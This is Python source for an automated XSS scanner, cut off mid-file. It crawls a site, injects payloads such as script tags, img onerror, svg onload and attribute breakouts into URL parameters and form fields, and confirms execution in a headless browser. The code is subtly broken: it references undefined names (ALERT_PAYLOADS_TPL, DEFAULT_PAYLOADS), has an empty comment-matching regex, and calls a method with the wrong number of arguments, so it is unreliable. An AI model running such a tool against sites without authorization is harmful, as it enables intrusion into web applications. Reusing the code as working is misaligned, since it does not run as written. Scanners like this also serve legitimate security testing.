# xsspy_scanner.py (v1.0 - Refactored from v12)
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote
import argparse
import sys
import time
from collections import deque
import concurrent.futures
import os
import re
import uuid
import copy
import json
import logging # Use logging module

# Selenium imports
from selenium import webdriver
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.common.exceptions import (
    TimeoutException, UnexpectedAlertPresentException, NoAlertPresentException,
    NoSuchElementException, WebDriverException, JavascriptException
)
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from webdriver_manager.chrome import ChromeDriverManager

# --- Constants ---
__version__ = "1.0"
DOM_PAYLOAD_ATTRIBUTE = 'data-xsspy-success' # Renamed attribute
DOM_PAYLOAD_VALUE = 'true'
CONFIRMATION_WAIT_TIMEOUT = 3
MAX_WORKERS_DEFAULT = 10
UNIQUE_PROBE_PREFIX = "xSsPyPrObE"
STORED_MARKER_PREFIX = "XSSPYMARK"
DOM_SINK_MARKER_PREFIX = "DOMSINKMARKER"
MAX_DOM_CONFIRM_PAYLOADS = 5 # Limit confirmation attempts for performance

# Base execution strings with placeholder for marker {marker}
ALERT_EXEC_TPL = "alert('XSPY_{prefix}_{{marker}}')" # Added tool prefix
DOM_CHANGE_EXEC = f"document.body.setAttribute('{DOM_PAYLOAD_ATTRIBUTE}','{DOM_PAYLOAD_VALUE}')"
ALERT_CONSTRUCTOR_TPL = "[].constructor.constructor(alert('XSPYC_{prefix}_{{marker}}'))()"

# Default Payload Templates (Internal Fallback)
# Simplified internal list, rely more on external lists for real use
DEFAULT_PAYLOAD_TEMPLATES = [
    f"<script>{ALERT_EXEC_TPL}</script>",
    f"<img src=x onerror={ALERT_EXEC_TPL}>",
    f"<svg onload={ALERT_EXEC_TPL}>",
    f"<details open ontoggle={ALERT_EXEC_TPL}><summary>T</summary></details>",
    f"<input autofocus onfocus={ALERT_EXEC_TPL}>",
    f"<img src=x onerror=\"{DOM_CHANGE_EXEC}\">", # DOM Change payload
    f"'>{ALERT_PAYLOADS_TPL[1]}", # Basic breakout example (index 1 is img onerror)
    f"\">{ALERT_PAYLOADS_TPL[1]}", # Basic breakout example
]

# Context dictionary - Simplified internal version, assumes external list preferred
# Keys should match return values of analyze_reflection_context
CONTEXT_PAYLOADS_TPL_INTERNAL = {
    "HTML_TEXT": [p for p in DEFAULT_PAYLOAD_TEMPLATES if not p.startswith(('"', "'", " ", ";"))],
    "HTML_ATTR_DQ": [f'">{p}' for p in DEFAULT_PAYLOAD_TEMPLATES if p.startswith('<')] + [f'" autofocus onfocus="{ALERT_EXEC_TPL.format(prefix="ATTRDQ")}"'],
    "HTML_ATTR_SQ": [f"'>{p}" for p in DEFAULT_PAYLOAD_TEMPLATES if p.startswith('<')] + [f"' autofocus onfocus='{ALERT_EXEC_TPL.format(prefix='ATTRSQ')}'"],
    "HTML_ATTR_UQ": [f" autofocus onfocus={ALERT_EXEC_TPL.format(prefix='ATTRUQ')}", f" onload={ALERT_EXEC_TPL.format(prefix='ATTRUQ2')}"], # Needs space
    "SCRIPT_STRING_DQ": [f'";{ALERT_EXEC_TPL.format(prefix="JSDQ")};//'],
    "SCRIPT_STRING_SQ": [f"';{ALERT_EXEC_TPL.format(prefix='JSSQ')};//'],
    "SCRIPT_BLOCK": [f"{ALERT_EXEC_TPL.format(prefix='JSBLK')};"],
    "HTML_COMMENT": [f"--><img src=x onerror={ALERT_EXEC_TPL.format(prefix='COMM')}>"],
    "UNKNOWN": DEFAULT_PAYLOAD_TEMPLATES # Fallback uses default internal list
}

# --- Logging Setup ---
log = logging.getLogger('XSSpy')
log.setLevel(logging.INFO) # Default level
# Prevent Selenium Manager logs from propagating if noisy
logging.getLogger('selenium.webdriver.common.service').setLevel(logging.WARNING)
logging.getLogger('webdriver_manager').setLevel(logging.WARNING)

# Console handler
console_handler = logging.StreamHandler(sys.stdout)
console_formatter = logging.Formatter('[%(levelname).1s] %(message)s') # Simple format for console
console_handler.setFormatter(console_formatter)
log.addHandler(console_handler)

# File handler (optional)
file_handler = None

# --- Utility Functions ---
def format_payload(payload_template, marker):
    """Formats a payload template with a marker, handling errors."""
    try:
        # Handle templates expecting prefix and marker
        if "{prefix}" in payload_template and "{marker}" in payload_template:
             prefix_match = re.search(r"alert\('([^'_]+)_\{marker\}'\)", payload_template) \
                         or re.search(r"alert\('([^'_]+)_", payload_template) # Broader match for constructors etc.
             prefix = prefix_match.group(1) if prefix_match else "P"
             return payload_template.replace("{marker}", marker).replace("{prefix}", prefix)
        # Handle templates expecting only marker
        elif "{marker}" in payload_template:
            return payload_template.replace("{marker}", marker)
        # If no marker placeholder, return original
        return payload_template
    except Exception as e:
        log.warning(f"Error formatting payload: {e} - Template: {payload_template}")
        return payload_template # Fallback

def is_valid_url(url):
    """Basic check if a string looks like an HTTP/HTTPS URL."""
    parsed = urlparse(url)
    return all([parsed.scheme in ['http', 'https'], parsed.netloc])

# --- Scanner Class ---
class Scanner:
    """Encapsulates the XSS scanning logic and state."""

    def __init__(self, start_url, max_depth=2, workers=MAX_WORKERS_DEFAULT,
                 payload_templates=None, delay=0, user_agent=None,
                 no_headless=False, skip_stored=False):
        """Initializes the Scanner."""
        if not is_valid_url(start_url):
            raise ValueError(f"Invalid starting URL: {start_url}")

        self.start_url = start_url
        self.base_domain = urlparse(start_url).netloc
        self.max_depth = max(1, max_depth) # Ensure depth is at least 1
        self.workers = workers
        self.delay = max(0, delay)
        self.use_headless = not no_headless
        self.skip_stored_check = skip_stored

        self.payload_templates = payload_templates if payload_templates else DEFAULT_PAYLOADS
        self.stored_candidate_payloads = [p for p in self.payload_templates if "{marker}" in p]
        if not self.stored_candidate_payloads:
             log.warning("No payload templates with '{marker}' found. Stored XSS correlation may fail.")

        self.session = self._setup_session(user_agent)
        self.driver = self._setup_driver() if self.use_headless else None

        # State during scan
        self.visited_urls = set()
        self.findings = [] # Combined findings list
        self.submitted_payloads_log = [] # For stored XSS
        self.marker_to_submission = {} # For stored XSS correlation

        log.info(f"XSSpy Scanner v{__version__} initialized.")
        log.info(f"Target: {self.start_url}, Max Depth: {self.max_depth}, Workers: {self.workers}, Delay: {self.delay}s")
        log.info(f"Headless Checks: {'Enabled' if self.use_headless else 'Disabled'}")
        log.info(f"Stored XSS Check: {'Enabled' if not self.skip_stored_check and self.use_headless else 'Disabled'}")
        log.info(f"Payloads loaded: {len(self.payload_templates)} (using {'default' if payload_templates is None else 'provided'} list)")

    def _setup_session(self, user_agent=None):
        """Creates and configures a requests session."""
        session = requests.Session()
        ua = user_agent if user_agent else f'XSSpy/{__version__} (+https://github.com/your-repo)'
        session.headers.update({'User-Agent': ua})
        # Add other headers if needed (e.g., Accept-Language)
        return session

    def _setup_driver(self):
        """Sets up the Selenium WebDriver."""
        log.info("Setting up headless browser (Selenium)...")
        chrome_options = ChromeOptions(); chrome_options.add_argument("--headless"); chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage"); chrome_options.add_argument("--disable-gpu"); chrome_options.add_argument("--log-level=3")
        chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
        try:
            os.environ['WDM_LOG_LEVEL'] = '0'; service = ChromeService(ChromeDriverManager().install())
            driver = webdriver.Chrome(service=service, options=chrome_options); driver.set_page_load_timeout(15); return driver
        except ValueError as ve: log.error(f"WebDriver Manager Error: {ve}. Check network or cache."); return None
        except WebDriverException as wde: log.error(f"WebDriver Error during setup: {wde}"); return None
        except Exception as e: log.error(f"Failed to set up Selenium WebDriver: {e}"); return None

    def _get_links(self, url):
        """Fetches and parses HTML to find all valid links on the same domain."""
        links = set()
        try:
            response = self.session.get(url, timeout=10); response.raise_for_status()
            content_type = response.headers.get('content-type', '').lower()
            if 'html' not in content_type: return set()
            soup = BeautifulSoup(response.content, 'html.parser')
            for a_tag in soup.find_all('a', href=True):
                href = a_tag['href']
                try:
                    if href.strip().lower().startswith('javascript:'): continue
                    full_url = urljoin(url, href); parsed_link = urlparse(full_url)
                    if parsed_link.scheme in ['http', 'https'] and parsed_link.netloc == self.base_domain:
                        links.add(parsed_link._replace(fragment='').geturl())
                except ValueError: pass # Ignore mailto:, tel:, etc.
            return links
        except requests.exceptions.Timeout: log.warning(f"Timeout fetching links from {url}"); return set()
        except requests.exceptions.RequestException as e: log.warning(f"Error fetching links from {url}: {e}"); return set()
        except Exception as e: log.warning(f"Error parsing links from {url}: {e}"); return set()

    def _get_forms(self, url):
        """Fetches and parses HTML to find all forms."""
        try:
            response = self.session.get(url, timeout=10); response.raise_for_status()
            content_type = response.headers.get('content-type', '').lower()
            if 'html' not in content_type: return []
            soup = BeautifulSoup(response.content, 'html.parser')
            return soup.find_all('form')
        except requests.exceptions.Timeout: log.warning(f"Timeout fetching forms from {url}"); return []
        except requests.exceptions.RequestException as e: log.warning(f"Error fetching forms from {url}: {e}"); return []
        except Exception as e: log.warning(f"Error parsing forms from {url}: {e}"); return []

    def _get_form_details(self, form):
        """Extracts details from a form element."""
        details = {}; action = form.attrs.get('action', ''); method = form.attrs.get('method', 'get').lower(); inputs = []
        try:
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                input_name = input_tag.attrs.get('name');
                if input_name is None: continue
                input_type = input_tag.attrs.get('type', 'text').lower(); input_value = input_tag.attrs.get('value', '')
                if input_tag.name == 'select' and not input_value:
                     option = input_tag.find('option', selected=True);
                     if not option: option = input_tag.find('option')
                     if option: input_value = option.attrs.get('value', option.text)
                inputs.append({'type': input_type, 'name': input_name, 'value': input_value})
        except Exception as e: log.warning(f"Error parsing inputs for a form: {e}")
        details['action'] = action; details['method'] = method; details['inputs'] = inputs; return details

    def _analyze_reflection_context(self, html_content, probe):
        """Analyzes HTML to guess the context of the reflected probe string."""
        # (Same basic heuristic logic as v10)
        contexts = set()
        for match in re.finditer(re.escape(probe), html_content):
            start, end = match.span()
            window_start = max(0, start - 80); window_end = min(len(html_content), end + 80)
            window = html_content[window_start:window_end]; probe_in_window_start = start - window_start
            script_match = re.search(r'<script.*?>(.*?)</script>', window, re.IGNORECASE | re.DOTALL)
            if script_match and script_match.start(1) <= probe_in_window_start < script_match.end(1):
                script_content_before_probe = window[script_match.start(1):probe_in_window_start]
                last_dq = script_content_before_probe.rfind('"'); last_sq = script_content_before_probe.rfind("'"); last_nl = script_content_before_probe.rfind('\n')
                last_comment_start = max(script_content_before_probe.rfind('//'), script_content_before_probe.rfind('/*'))
                if last_comment_start > max(last_dq, last_sq, last_nl): contexts.add("SCRIPT_BLOCK")
                elif last_dq > last_sq and last_dq > last_nl: contexts.add("SCRIPT_STRING_DQ" if start > 0 and html_content[start-1] != '\\' else "SCRIPT_BLOCK")
                elif last_sq > last_dq and last_sq > last_nl: contexts.add("SCRIPT_STRING_SQ" if start > 0 and html_content[start-1] != '\\' else "SCRIPT_BLOCK")
                else: contexts.add("SCRIPT_BLOCK")
                continue
            attr_match_dq = re.search(r'([\w:\-]+)\s*=\s*"\s*[^"]*$', html_content[window_start:start])
            attr_match_sq = re.search(r'([\w:\-]+)\s*=\s*\'\s*[^\']*$', html_content[window_start:start])
            attr_match_uq = re.search(r'([\w:\-]+)\s*=\s*([^\s>\'"]*)$', html_content[window_start:start])
            if attr_match_dq and end < len(html_content) and html_content[end:].lstrip().startswith('"'): contexts.add("HTML_ATTR_DQ"); continue
            if attr_match_sq and end < len(html_content) and html_content[end:].lstrip().startswith("'"): contexts.add("HTML_ATTR_SQ"); continue
            if attr_match_uq and end < len(html_content) and re.match(r'[\s/>]', html_content[end:].lstrip()):
                 if not html_content[end:].lstrip().startswith("'") and not html_content[end:].lstrip().startswith('"'): contexts.add("HTML_ATTR_UQ"); continue
            comment_match = re.search(r'', window, re.DOTALL)
            if comment_match and comment_match.start() < probe_in_window_start < comment_match.end(): contexts.add("HTML_COMMENT"); continue
            style_match = re.search(r'<style.*?>.*?</style>', window, re.IGNORECASE | re.DOTALL)
            if style_match and style_match.start() < probe_in_window_start < style_match.end(): contexts.add("CSS_BLOCK"); continue
            tag_match = re.search(r'<[\w-]+[^>]*$', html_content[window_start:start])
            if tag_match and end < len(html_content) and html_content[end:].lstrip().startswith('>'): contexts.add("HTML_TAG_DEFINITION"); continue
            if not contexts: contexts.add("HTML_TEXT")
        if not contexts: return ["UNKNOWN"]
        # Prioritization logic
        if "SCRIPT_STRING_DQ" in contexts: return ["SCRIPT_STRING_DQ"]
        if "SCRIPT_STRING_SQ" in contexts: return ["SCRIPT_STRING_SQ"]
        if "SCRIPT_BLOCK" in contexts: return ["SCRIPT_BLOCK"]
        if "HTML_ATTR_DQ" in contexts: return ["HTML_ATTR_DQ"]
        if "HTML_ATTR_SQ" in contexts: return ["HTML_ATTR_SQ"]
        if "HTML_ATTR_UQ" in contexts: return ["HTML_ATTR_UQ"]
        if "HTML_COMMENT" in contexts: return ["HTML_COMMENT"]
        if "CSS_BLOCK" in contexts: return ["CSS_BLOCK"]
        if "HTML_TAG_DEFINITION" in contexts: return ["HTML_TAG_DEFINITION"]
        if "HTML_TEXT" in contexts: return ["HTML_TEXT"]
        return list(contexts)

    def _confirm_xss_with_headless(self, url, payload_description=""):
        """Uses Selenium to visit a URL and check for an alert OR specific DOM change. Returns confirmation type and detail."""
        # (Same logic as v11, but uses self.driver and logs via self.log)
        if not self.driver: return None, None
        confirmation_type = None; confirmation_detail = ""
        try:
            self.driver.get(url); time.sleep(0.1)
            try: # Alert Check
                WebDriverWait(self.driver, CONFIRMATION_WAIT_TIMEOUT).until(EC.alert_is_present())
                alert = self.driver.switch_to.alert; alert_text = alert.text
                confirmation_detail = alert_text; log.info(f"  [+] CONFIRMED via Alert: Alert('{alert_text}') ({payload_description})")
                alert.accept(); confirmation_type = "Alert"; return confirmation_type, confirmation_detail
            except TimeoutException: pass
            except UnexpectedAlertPresentException:
                try:
                    alert = self.driver.switch_to.alert; alert_text = alert.text
                    confirmation_detail = alert_text; log.info(f"  [+] CONFIRMED via Unexpected Alert: Alert('{alert_text}') ({payload_description})")
                    alert.accept(); confirmation_type = "Alert (Unexpected)"; return confirmation_type, confirmation_detail
                except NoAlertPresentException: log.warning("  [!] Alert disappeared before handling.")
            if not confirmation_type: # DOM Check
                try:
                    WebDriverWait(self.driver, 0.5).until(lambda d: d.find_element(By.TAG_NAME, 'body').get_attribute(DOM_PAYLOAD_ATTRIBUTE) == DOM_PAYLOAD_VALUE)
                    confirmation_detail = f"Attribute {DOM_PAYLOAD_ATTRIBUTE}={DOM_PAYLOAD_VALUE}"; log.info(f"  [+] CONFIRMED via DOM Change: {confirmation_detail} ({payload_description})")
                    confirmation_type = "DOM Change"; return confirmation_type, confirmation_detail
                except TimeoutException: pass
                except NoSuchElementException: pass
                except Exception as e_dom: log.warning(f"  [!] Error during DOM check: {e_dom}")
            return None, None # Not confirmed
        except TimeoutException: log.warning(f"  [!] Page load timed out during confirmation: {url[:100]}"); return None, None
        except WebDriverException as wde:
             if "net::ERR_INVALID_URL" in str(wde): log.warning(f"  [!] Invalid URL generated for confirmation: {url[:100]}")
             # else: log.warning(f"  [!] WebDriver error during confirmation for {url[:100]}: {wde}") # Can be noisy
             return None, None
        except Exception as e: log.warning(f"  [!] Unexpected error during headless confirmation for {url[:100]}: {e}"); return None, None

    def _task_test_url_param_probe(self, url, param_name, probe):
        """Task for ThreadPoolExecutor: Tests a single URL parameter for probe reflection."""
        # Simplified version of v9's task_test_url_param, only for probe
        parsed_url = urlparse(url)
        try:
            query_params = parse_qs(parsed_url.query)
            if param_name not in query_params: return None
            modified_params = query_params.copy(); modified_params[param_name] = [probe]
            modified_query = urlencode(modified_params, doseq=True); test_url = parsed_url._replace(query=modified_query).geturl()
            response = self.session.get(test_url, timeout=10, allow_redirects=True)
            # Check for reflection before decoding fully to potentially save memory
            # This is tricky with encodings. Decode for reliable check.
            response_body = response.content.decode(errors='ignore')
            if probe in response_body:
                return {'response_body': response_body, 'final_url': response.url}
            return None
        except requests.exceptions.Timeout: return None
        except requests.exceptions.RequestException: return None
        except Exception: return None # Catch all for task stability

    def _task_test_form_probe(self, form_details, url, probe):
        """Task for ThreadPoolExecutor: Tests a single form submission for probe reflection."""
        # Simplified version of v9's task_test_form, only for probe
        target_url = urljoin(url, form_details['action'])
        inputs = form_details['inputs']; data = {}; tested_fields = []
        for input_item in inputs:
            if not input_item.get('name'): continue
            # Inject probe into all text-like fields for probing phase
            if input_item['type'] in ['text', 'search', 'url', 'email', 'tel', 'password', 'textarea', 'hidden']:
                data[input_item['name']] = probe; tested_fields.append(input_item['name'])
            else: data[input_item['name']] = input_item['value']
        if not tested_fields: return None
        try:
            response = None
            if form_details['method'] == 'post': response = self.session.post(target_url, data=data, timeout=10, allow_redirects=True)
            else: response = self.session.get(target_url, params=data, timeout=10, allow_redirects=True)
            response_body = response.content.decode(errors='ignore')
            if probe in response_body:
                return {'response_body': response_body, 'final_url': response.url}
            return None
        except requests.exceptions.Timeout: return None
        except requests.exceptions.RequestException: return None
        except Exception: return None

    def _task_inject_and_confirm(self, url, injection_point_type, param_or_form_details, payload_template):
        """Task: Formats payload with marker, injects, performs confirmation, and logs for stored XSS."""
        # (Same logic as v9, but uses self.driver, self.session, self.log etc.)
        test_url = None; final_url = None
        result_base = {'payload_template': payload_template, 'confirmed': False}
        marker = None; formatted_payload = payload_template
        # Check if this payload template is a candidate for stored logging
        log_submission = payload_template in self.stored_candidate_payloads

        if log_submission:
            marker = f"{STORED_MARKER_PREFIX}_{uuid.uuid4().hex[:8]}"
            formatted_payload = format_payload(payload_template, marker)
            log_entry = {'submit_url': url, 'payload_template': payload_template, 'marker': marker}
            if injection_point_type == 'URL_PARAM': log_entry.update({'context': 'param', 'details': {'name': param_or_form_details['name']}})
            elif injection_point_type == 'FORM':
                log_details = copy.deepcopy(param_or_form_details)
                # Ensure injected_fields exists even if tested_fields is empty later
                log_details['injected_fields'] = [inp['name'] for inp in log_details.get('inputs',[]) if inp.get('type') in ['text', 'search', 'url', 'email', 'tel', 'password', 'textarea', 'hidden']]
                log_entry.update({'context': 'form', 'details': log_details})
            # Use try-except for thread safety if modifying global list directly, or use a queue
            try: self.submitted_payloads_log.append(log_entry); self.marker_to_submission[marker] = log_entry
            except Exception as e: log.error(f"Error logging submission: {e}")
        else:
             # Format payload even if not logging stored, might have non-marker templates
             formatted_payload = format_payload(payload_template, "REFLECT") # Use generic marker if needed


        try:
            if injection_point_type == 'URL_PARAM':
                param_name = param_or_form_details['name']; parsed_url = urlparse(url); query_params = parse_qs(parsed_url.query)
                if param_name not in query_params: return None
                modified_params = query_params.copy(); modified_params[param_name] = [formatted_payload]
                modified_query = urlencode(modified_params, doseq=True); test_url = parsed_url._replace(query=modified_query).geturl()
                response = self.session.get(test_url, timeout=10, allow_redirects=True); final_url = response.url
                result_base.update({'type': 'URL Parameter', 'url': url, 'parameter': param_name, 'final_url': final_url})
            elif injection_point_type == 'FORM':
                form_details = param_or_form_details; target_url = urljoin(url, form_details['action'])
                inputs = form_details['inputs']; data = {}; tested_fields = []
                for input_item in inputs:
                    if not input_item.get('name'): continue
                    if input_item['type'] in ['text', 'search', 'url', 'email', 'tel', 'password', 'textarea', 'hidden']:
                        data[input_item['name']] = formatted_payload; tested_fields.append(input_item['name'])
                    else: data[input_item['name']] = input_item['value']
                if not tested_fields: return None # Skip if no fields were injected
                if form_details['method'] == 'post': response = self.session.post(target_url, data=data, timeout=10, allow_redirects=True)
                else: response = self.session.get(target_url, params=data, timeout=10, allow_redirects=True)
                final_url = response.url
                result_base.update({'type': 'Form Input', 'url': url, 'action': form_details['action'], 'method': form_details['method'], 'fields': tested_fields, 'final_url': final_url})
            else: return None

            if self.driver and final_url:
                confirmation_type, confirmation_detail = self._confirm_xss_with_headless(final_url, payload_description=f"{result_base.get('type','Unknown')} Payload: {formatted_payload[:50]}...")
                if confirmation_type:
                    result_base['confirmed'] = True; result_base['confirmation_type'] = confirmation_type; result_base['confirmation_detail'] = confirmation_detail
                    result_base['payload'] = formatted_payload; return result_base
            return None # Not confirmed or no driver
        except requests.exceptions.Timeout: return None
        except requests.exceptions.RequestException: return None
        except Exception as e: log.warning(f"Error in task_inject_and_confirm for {formatted_payload[:50]}: {e}"); return None

    def _scan_page_reflected_context_aware(self, url, executor):
        """Scans a single page for REFLECTED XSS using context analysis."""
        log.info(f"Scanning (Context-Aware Reflected) {url}...")
        confirmed_vulnerabilities = []; probe = f"{UNIQUE_PROBE_PREFIX}{uuid.uuid4().hex[:8]}"
        param_probe_results = {}; form_probe_results = {}; form_details_list = []
        # --- 1. Probe Injection Points ---
        parsed_url = urlparse(url); query_params = parse_qs(parsed_url.query); probe_futures = []
        if query_params:
            param_map = {}
            for param_name in query_params.keys():
                if not query_params[param_name]: continue
                future = executor.submit(self._task_test_url_param_probe, url, param_name, probe)
                probe_futures.append(future); param_map[future] = param_name
            for future in concurrent.futures.as_completed(param_map):
                 param_name = param_map[future]; probe_result = future.result()
                 if probe_result and probe in probe_result.get('response_body', ''): param_probe_results[param_name] = (probe_result['response_body'], probe_result['final_url'])
        probe_futures = []
        forms = self._get_forms(url)
        if forms:
            form_map = {}
            for i, form in enumerate(forms):
                details = self._get_form_details(form);
                if not details['inputs']: continue
                form_details_list.append(details) # Store details by index
                future = executor.submit(self._task_test_form_probe, details, url, probe)
                probe_futures.append(future); form_map[future] = i
            for future in concurrent.futures.as_completed(form_map):
                 form_index = form_map[future]; probe_result = future.result()
                 # Ensure form_index is valid before accessing form_details_list
                 if form_index < len(form_details_list) and probe_result and probe in probe_result.get('response_body', ''):
                      form_probe_results[form_index] = (probe_result['response_body'], probe_result['final_url'])
                 elif probe_result is None:
                      pass # Task failed silently, already logged maybe
                 else:
                      log.warning(f"Probe result received but marker '{probe}' not found or index mismatch.")


        # --- 2. Analyze Context and Launch Exploit Payloads ---
        exploit_futures = []
        if not self.driver: log.warning("Skipping exploit phase as headless browser is disabled."); return []
        processed_probes = 0
        # URL Params Exploitation
        for param_name, (response_body, final_url) in param_probe_results.items():
            processed_probes += 1; contexts = self._analyze_reflection_context(response_body, probe)
            log.debug(f"    - Param '{param_name}': Detected context(s): {contexts}")
            payload_templates_to_try = set()
            for ctx in contexts: payload_templates_to_try.update(CONTEXT_PAYLOADS_TPL_INTERNAL.get(ctx, CONTEXT_PAYLOADS_TPL_INTERNAL["UNKNOWN"]))
            param_details = {'name': param_name}
            log.debug(f"      -> Trying {len(payload_templates_to_try)} context-specific payloads for '{param_name}'...")
            for payload_template in payload_templates_to_try:
                log_submission = payload_template in self.stored_candidate_payloads # Check if template is candidate
                exploit_futures.append(executor.submit(self._task_inject_and_confirm, url, 'URL_PARAM', param_details, payload_template, self.session, self.driver, log_submission))
        # Forms Exploitation
        for i, (response_body, final_url) in form_probe_results.items():
             if i < len(form_details_list): # Check index validity
                processed_probes += 1; form_details = form_details_list[i]; contexts = self._analyze_reflection_context(response_body, probe)
                log.debug(f"    - Form (Action='{form_details['action']}'): Detected context(s): {contexts}")
                payload_templates_to_try = set()
                for ctx in contexts: payload_templates_to_try.update(CONTEXT_PAYLOADS_TPL_INTERNAL.get(ctx, CONTEXT_PAYLOADS_TPL_INTERNAL["UNKNOWN"]))
                log.debug(f"      -> Trying {len(payload_templates_to_try)} context-specific payloads for form...")
                for payload_template in payload_templates_to_try:
                     log_submission = payload_template in self.stored_candidate_payloads
                     exploit_futures.append(executor.submit(self._task_inject_and_confirm, url, 'FORM', form_details, payload_template, self.session, self.driver, log_submission))
             else:
                  log.error(f"Form index {i} out of range for form_details_list (len {len(form_details_list)})")


        # --- 3. Collect Confirmed Vulnerabilities ---
        if exploit_futures:
            log.info(f"Waiting for {len(exploit_futures)} context-aware exploit checks from {processed_probes} reflection points...")
            processed_count = 0
            for future in concurrent.futures.as_completed(exploit_futures):
                processed_count += 1; result = future.result()
                if result and result.get('confirmed'): confirmed_vulnerabilities.append(result)
            log.info(f"Context-aware exploit checks complete for {url}. Confirmed {len(confirmed_vulnerabilities)} reflected.")
        return confirmed_vulnerabilities

    def _check_dom_sinks(self, url, marker):
        """Uses JS execution to check if marker appears in dangerous sinks."""
        # (Same logic as v11, but uses self.driver and self.log)
        if not self.driver: return None
        found_in_sink = None
        try:
            body_html = self.driver.execute_script("return document.body.innerHTML;")
            if marker in body_html: found_in_sink = "body.innerHTML"
            marker_json = json.dumps(marker)
            script = f"""
                const marker = {marker_json}; let sinksFound = {{}};
                const tagsToCheck = ['img', 'svg', 'body', 'iframe', 'video', 'audio', 'input', 'details', 'marquee', 'a', 'form'];
                const attrsToCheck = ['onerror', 'onload', 'onmouseover', 'onfocus', 'onclick', 'ontoggle', 'onstart', 'onpageshow', 'onpointerrawupdate', 'onpointerenter', 'onauxclick', 'background', 'action', 'href'];
                tagsToCheck.forEach(tagName => {{ try {{
                    document.querySelectorAll(tagName).forEach(el => {{ attrsToCheck.forEach(attrName => {{
                        if (el.hasAttribute(attrName) && el.getAttribute(attrName).includes(marker)) {{ sinksFound[`${{tagName}}[@${{attrName}}]`] = el.getAttribute(attrName).substring(0, 50) + '...'; }}
                    }});
                    if ((tagName === 'a' || tagName === 'iframe' || tagName === 'form') && el.hasAttribute('href') && el.getAttribute('href').toLowerCase().startsWith('javascript:') && el.getAttribute('href').includes(marker)) {{ sinksFound[`${{tagName}}[@href=javascript:]`] = el.getAttribute('href').substring(0, 50) + '...'; }}
                    if ((tagName === 'img' || tagName === 'iframe' || tagName === 'script') && el.hasAttribute('src') && el.getAttribute('src').toLowerCase().startsWith('javascript:') && el.getAttribute('src').includes(marker)) {{ sinksFound[`${{tagName}}[@src=javascript:]`] = el.getAttribute('src').substring(0, 50) + '...'; }}
                }}); }} catch (e) {{ console.warn(`Error querying ${{{tagName}}}: ${{{e}}}`); }} }});
                document.querySelectorAll('script').forEach((script, index) => {{ try {{
                    if (script.textContent.includes(marker)) {{ sinksFound[`script[${{index}}].textContent`] = script.textContent.substring(0, 100) + '...'; }}
                }} catch (e) {{ console.warn(`Error checking script[${{{index}}}]: ${{{e}}}`); }} }});
                return sinksFound;
            """
            potential_sinks = self.driver.execute_script(script)
            if potential_sinks:
                log.warning(f"    [!] Marker '{marker}' found in potential DOM sinks: {potential_sinks}")
                if any(k.startswith(('img[','svg[','body[','iframe[','video[','audio[','input[','details[','marquee[','a[','form[')) for k in potential_sinks): found_in_sink = "Attribute Handler / JS URI"
                elif any(k.startswith('script[') for k in potential_sinks): found_in_sink = "Script Content"
                elif not found_in_sink: found_in_sink = "innerHTML (Generic)"
            return found_in_sink
        except JavascriptException as jse: log.warning(f"    [!] JavaScript error during sink check for {url}: {jse}"); return None
        except Exception as e: log.warning(f"    [!] Error during DOM sink check for {url}: {e}"); return None

    def _scan_dom_source_query(self, url, executor):
        """Scans for DOM XSS originating from URL Query Params, checks sinks, then attempts confirmation."""
        # (Same logic as v11, but uses self.driver, self.log, self._confirm_xss_with_headless etc.)
        if not self.driver: return []
        log.info(f"Scanning (DOM XSS via Query Params) {url}...")
        confirmed_vulns = []; potential_params = {}
        parsed_url = urlparse(url); query_params = parse_qs(parsed_url.query); base_url = parsed_url._replace(query='').geturl()
        if not query_params: return []

        log.debug(f"  [*] Phase 1 (DOM Query): Checking {len(query_params)} params for sink reflection...")
        for param_name in query_params.keys():
            if not query_params[param_name]: continue
            marker = f"{DOM_SINK_MARKER_PREFIX}_{uuid.uuid4().hex[:8]}"
            modified_params = query_params.copy(); modified_params[param_name] = [marker]
            modified_query = urlencode(modified_params, doseq=True); test_url_marker = parsed_url._replace(query=modified_query).geturl()
            try:
                self.driver.get(test_url_marker); time.sleep(0.2)
                sink_found = self._check_dom_sinks(test_url_marker, marker)
                if sink_found:
                    log.info(f"    [+] Potential Sink Found: Param '{param_name}' marker reached sink '{sink_found}'")
                    potential_params[param_name] = sink_found
            except TimeoutException: log.warning(f"    [!] Timeout navigating for marker check on param '{param_name}'")
            except WebDriverException as e: log.warning(f"    [!] WebDriver error during marker check for param '{param_name}': {e}")
            except Exception as e: log.error(f"    [!] Error during marker check for param '{param_name}': {e}")

        if not potential_params: log.debug(f"  [*] Phase 2 (DOM Query): No potential sinks found."); return []

        log.info(f"  [*] Phase 2 (DOM Query): Attempting execution confirmation for {len(potential_params)} potential params...")
        payloads_for_confirm = self.payload_templates[:MAX_DOM_CONFIRM_PAYLOADS]

        for param_name, sink_type in potential_params.items():
            log.debug(f"    - Confirming param '{param_name}' (Sink Type: {sink_type})...")
            for payload_template in payloads_for_confirm:
                 confirm_marker = f"{STORED_MARKER_PREFIX}_{uuid.uuid4().hex[:8]}"
                 executable_payload = format_payload(payload_template, confirm_marker)
                 modified_params = query_params.copy(); modified_params[param_name] = [executable_payload]
                 modified_query = urlencode(modified_params, doseq=True); test_url_confirm = parsed_url._replace(query=modified_query).geturl()
                 confirmation_type, confirmation_detail = self._confirm_xss_with_headless(test_url_confirm, payload_description=f"DOM Query Confirm: {param_name} / {executable_payload[:40]}...")
                 if confirmation_type:
                     log.info(f"      [***] CONFIRMED DOM XSS for Param '{param_name}'!")
                     confirmed_vulns.append({'type': 'DOM-based XSS (Confirmed - Query Param)', 'url': url, 'source': f"Query Parameter ({param_name})", 'sink_detected': sink_type, 'payload': executable_payload, 'payload_template': payload_template, 'marker': confirm_marker, 'confirmed': True, 'confirmation_type': confirmation_type, 'confirmation_detail': confirmation_detail, 'final_url': test_url_confirm})
                     break # Stop trying payloads for this parameter
        log.info(f"[*] DOM XSS Query Param Scan complete for {url}. Confirmed {len(confirmed_vulns)} instances.")
        return confirmed_vulns

    def _scan_dom_source_hash(self, url):
        """Scans for DOM XSS by injecting formatted payloads into the URL fragment."""
